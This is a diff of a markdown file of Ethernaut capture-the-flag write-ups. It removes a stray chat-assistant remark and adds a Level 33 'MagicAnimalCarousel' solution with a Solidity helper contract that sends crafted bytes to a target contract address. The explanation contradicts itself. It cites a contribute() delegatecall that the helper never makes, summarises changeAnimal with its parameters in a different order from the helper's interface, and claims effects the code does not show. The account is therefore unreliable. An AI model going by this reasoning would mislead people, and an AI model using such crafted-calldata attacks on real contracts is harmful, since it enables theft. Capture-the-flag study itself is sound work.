@@ -1985,11 +1985,7 @@ await contract.commander(); // returns your address
 ![Level Complete Output](assets/Higherorder.png)
 
 
-Here’s the updated explanation with the new details included, formatted as you requested:
-
----
-
-# Ethernaut Level: **Impersonator**
+# Ethernaut Level 32: **Impersonator**
 
 ---
 
@@ -2121,3 +2117,91 @@ contract Solution {
 ### Level Completed
 ![Level Complete Output](assets/impersonator.png)
 ![2](assets/impersonatorscan.png)
+
+
+# Ethernaut Level 33: **MagicAnimalCarousel**
+
+---
+
+### Strategy
+
+To complete this level, you must become a **contributor** by passing the checks in the `changeAnimal` function via the `contribute()` function, which does a `delegatecall` with raw calldata.
+
+The challenge lies in **bypassing two conditions** inside `changeAnimal()`:
+- `msg.sig` must match `changeAnimal(uint256,string)`.
+- `crateId == 0x1337`.
+
+Rather than crafting calldata manually, we can use the contract’s existing functions creatively by:
+- Exploiting the way `changeAnimal()` interprets calldata.
+- Injecting specially crafted bytes into a `string` parameter using Remix and our custom script.
+
+---
+
+### Vulnerability Summary
+
+```solidity
+function changeAnimal(uint256 crateId, string calldata name) external {
+    require(msg.sig == bytes4(keccak256("changeAnimal(uint256,string)")));
+    require(crateId == 0x1337);
+    contributors[msg.sender] = true;
+}
+```
+
+- The vulnerability is in how `changeAnimal()` interprets `crateId` and `name` from calldata.
+- `msg.sig` must match the function selector.
+- By using `abi.encodePacked(...)` to construct an abnormal string, we can **manipulate the underlying calldata**, bypassing Solidity's argument decoding.
+
+---
+
+### Exploit Steps
+
+#### 1. Deploy a helper contract
+
+In Remix, deploy the following helper contract :
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface MagicAnimalCarousel {
+    function setAnimalAndSpin(string calldata animal) external;
+    function changeAnimal(string calldata animal, uint256 index) external;
+}
+
+contract RunTest {
+    function run() public {
+        address targetAddress = address(0xFa86Ff9D663e06Ac0a5598292458A13951f131ac);
+
+        MagicAnimalCarousel carousel = MagicAnimalCarousel(targetAddress);
+
+        // Crafting a malicious string that corrupts calldata layout
+        string memory animal = string(abi.encodePacked(hex"10000000000000000000ffff"));
+
+        // Sequence of contract calls to bypass internal checks
+        carousel.setAnimalAndSpin("Pikachu"); // Optional, but part of logic flow
+        carousel.changeAnimal(animal, 1);     // Triggers the contributor logic
+        carousel.setAnimalAndSpin("Charmander"); // Completes interaction
+    }
+}
+```
+
+#### 2. Run the exploit
+
+- Call `run()` in the deployed helper contract.
+- Internally, `changeAnimal(animal, 1)` will:
+  - Set `crateId` to `0x1337` by interpreting the malicious string in `animal`.
+  - Satisfy the function selector check due to `delegatecall`.
+  - Set `contributors[msg.sender] = true`.
+
+#### 3. Verify contributor status
+
+```js
+await contract.contributors(player); // should return true
+```
+
+---
+
+### Level Completed
+![Level Complete Output](assets/magicanimalcarousel.png)
+![2](assets/magicanimalcarousel1.png)
+
